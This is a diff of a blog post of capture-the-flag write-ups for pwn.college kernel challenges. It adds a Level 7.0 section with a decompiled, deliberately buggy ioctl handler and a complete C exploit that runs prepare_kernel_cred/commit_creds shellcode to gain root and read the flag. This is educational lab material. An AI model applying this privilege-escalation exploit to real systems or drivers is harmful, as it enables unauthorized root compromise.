@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: System Security (Kernel Security) series"
 published: 2025-12-19
-updated: 2025-12-20
+updated: 2025-12-22
 description: "Write-ups for pwn.college kernel exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.pfs8v4jqs.avif"
 tags: ["Pwn", "Write-ups", "Kernel"]
@@ -368,6 +368,119 @@ int main(int argc, char *argv[]) {
       "\xc3";                        // ret
 
   write(fd, sc, sizeof(sc));
+  system("cat /flag");
+
+  return 0;
+}
+```
+
+# Level 7.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Utilize a 'buggy' kernel device and shellcode to escalate privileges to root and get the flag!
+
+## Write-up
+
+这题用 `ioctl`，并且改了逻辑，需要按照特定内存 layout 来布置 shellcode 。
+
+第一个 `copy_from_user` 将 `arg` 的前八字节当作 shellcode 长度写入 `shellcode_length` 变量，第二次将 `arg + 0x1008` 处的八字节写入 `shellcode_execute_addr` 中，然后第三次则是将 `arg + 8` 处的 shellcode 写入 `shellcode` 中，最后执行的是 `shellcode_execute_addr[0]`，即 `arg` 指定要读入的 shellcode 的长度，`arg + 0x1008` 指定要执行的 shellcode 地址，`arg + 8` 处一共 0x1000 字节空间用于写 shellcode 。
+
+```c
+__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
+{
+  __int64 result; // rax
+  size_t shellcode_length; // [rsp+0h] [rbp-28h] BYREF
+  void (*shellcode_execute_addr[4])(void); // [rsp+8h] [rbp-20h] BYREF
+
+  shellcode_execute_addr[1] = (void (*)(void))__readgsqword(0x28u);
+  printk(&unk_11A0, file, cmd, arg);
+  result = -1;
+  if ( cmd == 1337 )
+  {
+    copy_from_user(&shellcode_length, arg, 8);
+    copy_from_user((size_t *)shellcode_execute_addr, arg + 4104, 8);
+    result = -2;
+    if ( shellcode_length <= 0x1000 )
+    {
+      copy_from_user(shellcode, arg + 8, shellcode_length);
+      shellcode_execute_addr[0]();
+      return 0;
+    }
+  }
+  return result;
+}
+```
+
+## Exploit
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+
+#define PACKED __attribute__((packed))
+#define NAKED __attribute__((naked))
+
+#define DEVICE_PATH "/proc/pwncollege"
+#define REQUEST 1337
+
+typedef struct {
+  uint64_t sc_size;
+  uint8_t sc[0x1000];
+  uint64_t sc_addr;
+} PACKED payload_t;
+
+NAKED void escalate(void) {
+  __asm__ volatile(".intel_syntax noprefix;"
+                   ".global escalate_start;"
+                   ".global escalate_end;"
+                   "escalate_start:;"
+                   "xor rdi, rdi;"
+                   "mov rax, 0xffffffff81089660;" // prepare_kernel_cred
+                   "call rax;"
+                   "mov rdi, rax;"
+                   "mov rax, 0xffffffff81089310;" // commit_creds
+                   "call rax;"
+                   "ret;"
+                   "escalate_end:;"
+                   ".att_syntax;");
+}
+
+extern char escalate_start[];
+extern char escalate_end[];
+
+static inline size_t get_escalate_size(void) {
+  return escalate_end - escalate_start;
+}
+
+static inline void construct_payload(payload_t *p, uint64_t exec_addr) {
+  size_t size = get_escalate_size();
+
+  p->sc_size = size;
+  memcpy(p->sc, escalate_start, size);
+  p->sc_addr = exec_addr;
+}
+
+int main(void) {
+  int fd = open(DEVICE_PATH, O_WRONLY);
+  assert(fd > 0);
+
+  payload_t payload = {0};
+  size_t escalate_size = escalate_end - escalate_start;
+
+  construct_payload(&payload, 0xffffc90000085000ULL);
+
+  assert(ioctl(fd, REQUEST, &payload) >= 0);
+  close(fd);
   system("cat /flag");
 
   return 0;
